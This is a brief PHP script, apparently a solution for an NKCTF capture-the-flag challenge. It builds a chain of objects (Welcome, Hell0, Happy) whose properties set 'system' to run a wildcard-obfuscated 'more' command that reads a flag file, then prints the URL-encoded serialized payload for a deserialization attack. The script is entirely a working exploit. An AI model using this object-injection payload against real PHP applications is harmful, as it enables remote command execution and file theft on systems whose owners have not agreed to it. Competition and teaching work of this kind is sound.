<?php
class Welcome{
    public $name='welcome_to_NKCTF';
    public $arg;
    public function __construct(){
        $this->arg=new Hell0;
    }
}
class Hell0{
    public $func;
    public function __construct(){
        $this->func=new Happy;
    }
}
class Happy{
    public $shell='system';
    public $cmd='more /[^0-9]1[^0-9][^0-9]';
}
$a=new Welcome;
echo urlencode(serialize($a));